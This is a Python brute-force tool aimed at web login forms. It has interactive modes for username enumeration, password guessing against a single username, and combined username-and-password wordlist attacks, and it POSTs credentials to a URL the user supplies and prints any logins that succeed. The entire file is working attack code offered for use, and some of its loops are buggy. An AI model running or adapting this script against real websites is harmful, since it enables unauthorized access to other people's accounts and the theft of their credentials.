import os
import sys
import time
import colorama
import requests



def double_attack():
    print(colorama.Fore.RESET)
    url = input("Please enter the url:")
    username_wordlist_pathh = input("Please enter the wordlist path for username:")
    password_wordlist_pathh = input("Please enter the wordlist path for password:")
    error__message = input("Please enter the generated error message:")
    username__variable = input("Please enter the username variable:")
    password__variable = input("Please enter the password variable:")
    submit__variable = input("Please enter the submit variable:")
    submit__variable_value = input("Please enter the submit button's value:")
    print("\n" * 2)
    print("We controlling the paths,please wait...")
    if os.path.exists(password_wordlist_pathh) and os.path.exists(username_wordlist_pathh):
        if os.path.isfile(password_wordlist_pathh) and os.path.isfile(username_wordlist_pathh):
            print(colorama.Fore.BLUE)
            print("**********Results are prepairing**********")
            print("HERE YOU ARE!!!")
            time.sleep(0.6)
            print(colorama.Fore.RESET)
            opened_file_password = open(password_wordlist_pathh)
            opened_file_username =open(username_wordlist_pathh)
            for passwds in opened_file_password.readlines():
                passwds = passwds.strip().split("\n")
                for users in opened_file_username.readlines():
                    users=users.strip().split("\n")
                    payload = {username__variable: users, password__variable: passwds,
                               submit__variable: submit__variable_value}
                    attack_response = requests.post(url, data=payload)
                    if not error__message in str(attack_response.content):
                        print(colorama.Fore.GREEN)
                        print(f"[+] Login successfully-----> USERNAME:{users} and PASSWORD:{passwds}")
                        print(colorama.Fore.RESET)
                    else:
                        print(colorama.Fore.RED)
                        print(f"[-] Login failed!!!-----> USERNAME:{users} and PASSWORD:{passwds}")
                        print(colorama.Fore.RESET)

        else:
            print(colorama.Fore.RED)
            print("Unfortunately this is a not file!!!")
            print(colorama.Fore.RESET)
            sys.exit(1)
    else:
        print(colorama.Fore.RED)
        print("Unfortunately this path is not containing anythink!!!")
        print(colorama.Fore.RESET)
        sys.exit(1)


def username_enumeration():
    url=input("Please enter the url:")
    easy_password_for_testing="test"
    error_generated=input("Please enter the generated error message:")
    username_variable = input("Please enter the username variable:")
    password_variable = input("Please enter the password variable:")
    submit_variable = input("Please enter the submit variable:")
    submit_variable_value=input("Please enter the submit button's value:")
    testing_for_username=input("Please enter the username wordlist path:")
    print("\n" * 2)
    print("We controlling the paths,please wait...")
    if os.path.exists(testing_for_username):
        if os.path.isfile(testing_for_username):
            print(colorama.Fore.BLUE)
            print("**********Results are prepairing**********")
            print("HERE YOU ARE!!!")
            time.sleep(0.6)
            print(colorama.Fore.RESET)
            file=open(testing_for_username)
            for content in file.readlines():
                content=content.strip().split("\n")
                payload={username_variable:str(content),password_variable:easy_password_for_testing,submit_variable:submit_variable_value}
                enum_response=requests.post(url,data=payload)
                if not error_generated in str(enum_response.content):
                    print(colorama.Fore.YELLOW)
                    print("The page behaves differently, so maybe that's the username--->"+str(content))
                    print(colorama.Fore.RESET)
                    sys.exit()
                else:
                    print("[-] Not found!!!----->"+str(content))
        else:
            print(colorama.Fore.RED)
            print("Unfortunately this is a not file!!!")
            print(colorama.Fore.RESET)
            sys.exit(1)
    else:
        print(colorama.Fore.RED)
        print("Unfortunately this path is not containing anythink!!!")
        print(colorama.Fore.RESET)
        sys.exit(1)



def login_attack_by_username():
    url=input("Please enter the url:")
    specific_username=input("Please enter the specific username:")
    error_Message = input("Please enter the generated error message:")
    username_Variable = input("Please enter the username variable:")
    password_Variable = input("Please enter the password variable:")
    submit_Variable = input("Please enter the submit variable:")
    submit_Variable_value = input("Please enter the submit button's value:")
    password_Wordlist_Path=input("Please enter the wordlist path for password:")
    print("\n"*2)
    print("We controlling the paths,please wait...")

    if os.path.exists(password_Wordlist_Path):
        if os.path.isfile(password_Wordlist_Path):
            print(colorama.Fore.BLUE)
            print("**********Results are prepairing**********")
            print("HERE YOU ARE!!!")
            time.sleep(0.6)
            print(colorama.Fore.RESET)
            opened_file=open(password_Wordlist_Path)
            for passwwords in opened_file.readlines():
                passwwords=passwwords.strip().split("\n")
                payload={username_Variable:specific_username,password_Variable:passwwords,submit_Variable:submit_Variable_value}
                attack_response=requests.post(url,data=payload)
                if not error_Message in str(attack_response.content):
                    print(colorama.Fore.YELLOW)
                    print(f"[+] Login successfully-----> USERNAME:{specific_username} and PASSWORD:{passwwords}")
                    print(colorama.Fore.RESET)
                else:
                    print(colorama.Fore.RED)
                    print(f"[-] Login failed!!!-----> USERNAME:{specific_username} and PASSWORD:{passwwords}")
                    print(colorama.Fore.RESET)
        else:
            print(colorama.Fore.RED)
            print("Unfortunately this is a not file!!!")
            print(colorama.Fore.RESET)
            sys.exit(1)

    else:
        print(colorama.Fore.RED)
        print("Unfortunately this path is not containing anythink!!!")
        print(colorama.Fore.RESET)
        sys.exit(1)

print(colorama.Fore.MAGENTA);print("----------------WELCOME TO OUR BRUTE FORCE SCRIPT----------------")
print(colorama.Fore.RESET)
option_number=int(input("1--Username Enumeration\n2--Brute Force Using By Username\n3--Attacking Both By Wordlists\n\nPlease write your option number:"))



if option_number==1:
    username_enumeration()
elif option_number==2:
    login_attack_by_username()
elif option_number==3:
    double_attack()
else:
    print(colorama.Fore.RED)
    print("Wrong number!!!")
    print(colorama.Fore.RESET)
    sys.exit()
